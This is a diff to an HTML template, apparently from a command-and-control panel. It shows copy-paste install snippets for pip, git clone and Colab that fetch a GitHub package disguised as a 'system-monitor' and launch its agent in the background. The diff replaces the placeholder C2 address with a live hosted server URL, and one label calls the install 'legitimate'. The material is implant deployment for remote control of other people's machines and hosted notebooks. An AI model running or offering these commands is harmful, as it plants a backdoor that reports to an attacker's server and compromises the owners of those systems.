@@ -76,19 +76,19 @@
     <div class="grid gap-3 md:grid-cols-3">
       <div class="p-3 bg-bg-tertiary border border-border rounded-lg hover:border-accent/50 transition-colors">
         <div class="text-xs font-semibold text-accent mb-2">pip install from GitHub</div>
-        <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto">pip install git+https://github.com/GaredBerns/system-monitor.git && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
+        <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto">pip install git+https://github.com/GaredBerns/system-monitor.git && C2_URL=https://system-monitor-6dru.onrender.com python -m src.agents.universal &</div>
         <p class="text-[10px] text-text-muted mt-2">Легитимная установка</p>
       </div>
       <div class="p-3 bg-bg-tertiary border border-border rounded-lg hover:border-accent/50 transition-colors">
         <div class="text-xs font-semibold text-accent mb-2">git clone + run</div>
-        <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto">git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && cd /tmp/sysmon && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
+        <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto">git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && cd /tmp/sysmon && C2_URL=https://system-monitor-6dru.onrender.com python -m src.agents.universal &</div>
         <p class="text-[10px] text-text-muted mt-2">Клонирование и запуск</p>
       </div>
       <div class="p-3 bg-bg-tertiary border border-border rounded-lg hover:border-accent/50 transition-colors">
         <div class="text-xs font-semibold text-accent mb-2">Python Cell (Colab)</div>
         <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto whitespace-pre-wrap">!pip install git+https://github.com/GaredBerns/system-monitor.git
 import os, subprocess
-os.environ['C2_URL'] = 'http://YOUR_SERVER:5000'
+os.environ['C2_URL'] = 'https://system-monitor-6dru.onrender.com'
 subprocess.Popen(['python', '-m', 'src.agents.universal'])</div>
         <p class="text-[10px] text-text-muted mt-2">Для Jupyter/Colab</p>
       </div>
